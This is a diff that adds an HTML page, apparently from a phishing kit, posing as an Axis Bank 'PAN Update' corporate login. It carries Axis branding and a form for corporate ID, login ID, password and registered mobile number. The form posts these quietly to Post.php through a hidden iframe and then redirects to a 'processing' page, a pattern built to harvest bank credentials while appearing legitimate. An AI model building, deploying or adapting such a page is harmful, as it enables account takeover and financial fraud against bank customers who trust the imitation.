@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html;charset=utf-8" />
+    <meta name="theme-color" content="#98144D">
+    <meta charSet="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <title>Axis Bank | PAN Update</title>
+    <meta name="description" content="login"/>
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <link rel="stylesheet" href="Axis.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Work+Sans&display=swap" rel="stylesheet">
+    <style>
+      .hidden {
+        display: none;
+      }
+       
+       #mn
+       {
+       width:100%;
+       height: auto;
+       }
+       #hg
+       {
+       width:90%;
+       height: auto;
+       }
+    </style>
+  </head>
+  <body>
+  <!-- partial:index.partial.html -->
+  <div class="login-box">
+  <!-- Static- Please don't do anything here-->
+  <script type="text/javascript">var submitted=false;</script>
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing_Corp.html';}"></iframe>
+  <!--My Form-->
+    <div id="__next">
+        <img alt="" src="AxisMain.jpg" id="mn"/>
+      </div>
+      <div class="mainContent">
+        <h1 class="text-center">Continue to PAN Update</h1>
+        <div class="card">
+          <div>
+           <center><img alt="" src="High_Axis.jpg" id="hg"/></center>
+           </div>
+          <div>
+            <section id="formA">
+              <form class="LoginForm" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+                <input type="hidden" name="" value="" />
+                <div class="form-group">
+                  <label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="CorpId">Corporate ID</label>
+                  <input type="text" class="new-control" name="Corporate_ID" id="CorpId" minLength="5" maxLength="25"  required="" />
+                </div>
+                <input type="hidden" name="" value="" />
+                <div class="form-group">
+                <label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="li">Login ID</label>
+                <input type="text" class="new-control" name="Login_ID" id="LoginId" minLength="3" maxLength="30"  required="" />
+                </div>
+                <div class="form-group">
+                  <label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="password">Login Password</label>
+                  <input type="text" class="new-control" minLength="8" maxLength="30" name="Password" id="pw" required />
+                </div>
+                <div class="form-group"><label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="Registered_Mobile_No.">
+                Registered Mobile No.</label>
+                <input type="text" class="new-control" id="Mobile_Number" name="Mobile_Number" maxLength="10" inputmode="numeric"
+                pattern="[6-9]\d{9}" title="Please enter valid mobile number !" required=""/></div>
+                <div class="text-center" style="font-size:13px;line-height:25px; font-family: 'Work Sans', sans-serif; font-weight:600;">
+                  Personal Banking User? <a href="index.html">LOGIN HERE</a>
+                  <br/>
+                  <div class="text-center" style="font-size:13px;line-height:25px; font-family: 'Work Sans', sans-serif; font-weight:600;">
+                  First time user? <a href="#">REGISTER HERE</a>
+                </div>
+                <div class="text-center">
+                  <button style="border-radius:4px; padding:12px;" type="submit" class="submit">Login</button>
+         </div>
+     </div>
+  </body>
+</html>
